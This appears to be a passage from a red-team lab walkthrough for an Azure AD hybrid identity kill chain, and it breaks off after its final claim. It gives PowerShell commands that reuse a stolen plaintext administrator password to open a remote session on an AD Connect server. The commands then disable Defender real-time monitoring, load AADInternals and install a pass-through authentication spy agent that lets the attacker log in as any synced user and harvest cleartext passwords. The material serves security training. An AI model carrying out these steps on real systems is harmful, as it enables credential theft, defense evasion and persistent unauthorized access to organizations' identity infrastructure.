## Objective 25 ***Part of - Kill Chain - 2***

```
- Use the credentials for administrator of Azure AD connect that you compromised earlier and setup a backdoor on the AD Connect server of `defres.corp`
- Check if you can access the tenant as onpremdbadmin@defres.onmicrosoft.com user whose password we extracted.
```
- Recall that we extracted credentials for a user adconnectionadmin from `defeng-adminsrv` by compromising it using privileges of intune administrator. Going by the PowerShell history we extracted the credentials from, the user adconnectadmin may have administrative rights on `defers-adcnct`

Connect to defers-adcnct by using the credentials that we have
```powershell
$password = ConvertTo-SecureString 'UserIntendedToManageSyncWithCl0ud!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('adconnectadmin', $password)
$adcnct = New-PSSession -ComputerName 172.16.2.36 -Credential $creds
Enter-PSSession $adcnct
```

- Check if Azure AD connect is installed on defres-adcnct
```powershell
Get-ADSyncConnector
```
- Although not very reliable method, we can check if PTA is installed by checking if the PassthroughAuthPSModule is available on the 
machine.
```powershell
Get-Command -Module PassthroughAuthPSModule
```
- Load the AADInternals module in the PSRemtoing session and install a PTA agent
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
exit
Copy-Item -ToSession $adcnct -Path C:\AzAD\Tools\AADInternals.0.4.5.zip -Destination C:\Users\adconnectadmin\Documents
Enter-PSSession $adcnct
Expand-Archive C:\Users\adconnectadmin\Documents\AADInternals.0.4.5.zip -DestinationPath C:\Users\adconnectadmin\Documents\AADInternals
Import-Module C:\Users\adconnectadmin\Documents\AADInternals\AADInternals.psd1
```
- Install the PTA agent:
```powershell
Install-AADIntPTASpy
```
Now, we can authenticate as any user that is synced from on-prem and we can also get passwords in cleartext for the users that authenticate with the correct password: